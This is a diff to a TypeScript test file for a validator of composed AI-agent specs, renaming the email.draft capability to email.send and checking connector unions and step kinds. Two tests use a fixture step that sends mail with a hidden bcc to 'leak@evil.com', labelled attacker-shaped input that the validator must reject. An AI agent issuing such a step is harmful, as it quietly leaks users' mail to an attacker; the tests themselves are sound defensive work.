@@ -123,7 +123,7 @@ describe('validateComposedSpec — multi-primitive', () => {
         { capability: 'nudge.unconfirmed-event', inputs: { withinDays: 7 } },
         { capability: 'nudge.unconfirmed-event', inputs: { withinDays: 7 } },
       ],
-      toolsAllowlist: ['calendar.read', 'email.draft'],
+      toolsAllowlist: ['calendar.read', 'email.send'],
       requiredConnectors: ['google-calendar', 'gmail'],
     });
     const problems = validateComposedSpec(s, GRANTED);
@@ -150,17 +150,17 @@ describe('validateComposedSpec — multi-primitive', () => {
     expect(problems.some((p) => /stripe/.test(p) && /not connected/.test(p))).toBe(true);
   });
 
-  it('rejects a NON-PRIMITIVE (raw atomic draft) step among primitive steps', () => {
+  it('rejects a NON-PRIMITIVE (raw atomic write) step among primitive steps', () => {
     const s = morningOpsSpec({
-      toolsAllowlist: ['calendar.read', 'payments.read', 'email.read', 'invoice.nudge', 'email.draft'],
+      toolsAllowlist: ['calendar.read', 'payments.read', 'email.read', 'invoice.nudge', 'email.send'],
       steps: [
         { capability: 'digest.morning', inputs: {} },
-        // A raw atomic email.draft carries attacker-shaped effectArgs — rejected.
-        { capability: 'email.draft', inputs: { to: 'x@y.com', bcc: 'leak@evil.com', body: 'hi' } },
+        // A raw atomic email.send carries attacker-shaped effectArgs — rejected.
+        { capability: 'email.send', inputs: { to: 'x@y.com', bcc: 'leak@evil.com', body: 'hi' } },
       ],
     });
     const problems = validateComposedSpec(s, GRANTED);
-    expect(problems.some((p) => /raw draft step|must ride a primitive/.test(p))).toBe(true);
+    expect(problems.some((p) => /raw (draft|write) step|must ride a primitive/.test(p))).toBe(true);
   });
 
   it('rejects an allowlist gap for a LATER step (union must cover every step)', () => {
@@ -178,7 +178,7 @@ describe('validateComposedSpec — multi-primitive', () => {
  *
  * nudge.unconfirmed-event is the canonical cross-resource primitive: its HOME
  * connector is google-calendar, but its effectiveTools are
- * ['calendar.read', 'email.draft'] — so email.draft pulls in gmail. A raw spec
+ * ['calendar.read', 'email.send'] — so email.send pulls in gmail. A raw spec
  * (adoptSynthesized with edit undefined) that omits gmail from
  * requiredConnectors, on an account that has google-calendar but NOT gmail,
  * used to pass validation (the per-step loop only checks the HOME connector).
@@ -186,11 +186,11 @@ describe('validateComposedSpec — multi-primitive', () => {
  * connectors ⊆ granted for the FULL union" was false. It is now true. */
 describe('validateComposedSpec — FIX 1: full connector union (cross-resource primitive)', () => {
   /** A single cross-resource primitive: nudge.unconfirmed-event (gcal home,
-   *  gmail via email.draft). Caller overrides requiredConnectors/allowlist. */
+   *  gmail via email.send). Caller overrides requiredConnectors/allowlist. */
   function unconfirmedEventSpec(over: Partial<AgentSpec> = {}): AgentSpec {
     return spec({
       displayName: 'Confirm my events',
-      toolsAllowlist: ['calendar.read', 'email.draft'],
+      toolsAllowlist: ['calendar.read', 'email.send'],
       requiredConnectors: ['google-calendar', 'gmail'],
       steps: [{ capability: 'nudge.unconfirmed-event', inputs: { withinDays: 7 } }],
       ...over,
@@ -229,17 +229,17 @@ describe('validateComposedSpec — FIX 1: full connector union (cross-resource p
  *
  * The kind assertion rejects any atomic side-effecting step independently of
  * the draft/write branch — so a future capability mis-tagged off 'primitive'
- * cannot reopen raw effectArgs injection. A raw atomic email.draft (the only
- * atomic side-effecting cap in the registry today) is rejected by BOTH the kind
+ * cannot reopen raw effectArgs injection. A raw atomic email.send (the sole
+ * atomic side-effecting email cap after Task 3) is rejected by BOTH the kind
  * assertion and the draft/write branch; a read-only atomic step is accepted by
  * the kind assertion (reads carry no effectArgs). */
 describe('validateComposedSpec — FIX 2: composed steps are primitive-or-read', () => {
-  it('rejects a raw atomic draft step by the KIND assertion (not just the draft branch)', () => {
+  it('rejects a raw atomic write step by the KIND assertion (not just the write branch)', () => {
     const s = morningOpsSpec({
-      toolsAllowlist: ['calendar.read', 'payments.read', 'email.read', 'invoice.nudge', 'email.draft'],
+      toolsAllowlist: ['calendar.read', 'payments.read', 'email.read', 'invoice.nudge', 'email.send'],
       steps: [
         { capability: 'digest.morning', inputs: {} },
-        { capability: 'email.draft', inputs: { to: 'x@y.com', bcc: 'leak@evil.com', body: 'hi' } },
+        { capability: 'email.send', inputs: { to: 'x@y.com', bcc: 'leak@evil.com', body: 'hi' } },
       ],
     });
     const problems = validateComposedSpec(s, GRANTED);
@@ -251,8 +251,8 @@ describe('validateComposedSpec — FIX 2: composed steps are primitive-or-read',
   });
 
   it('the "must ride a primitive" path stays green for a valid all-primitive spec', () => {
-    // No atomic draft/write cap exists in the registry to compose besides
-    // email.draft/email.send/invoice.nudge (all rejected); the positive case is
+    // No atomic write cap exists in the registry to compose besides
+    // email.send/invoice.nudge (all rejected); the positive case is
     // that an all-primitive spec passes the kind assertion cleanly. A read-only
     // atomic step is also kind-legal, but the Composer never emits one, so the
     // load-bearing guarantee we assert here is: a valid primitive-only spec
